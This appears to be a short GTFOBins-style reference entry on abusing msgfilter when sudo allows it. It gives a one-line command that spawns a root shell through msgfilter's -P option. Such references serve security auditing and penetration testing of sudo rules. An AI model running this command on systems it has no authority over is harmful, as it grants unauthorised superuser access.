***** Sudo *****
If the binary is allowed to run as superuser by sudo, it does not drop the
elevated privileges and may be used to access the file system, escalate or
maintain privileged access.
    * Any text file will do as the input (use -i). kill is needed to spawn the
      shell only once.
      echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
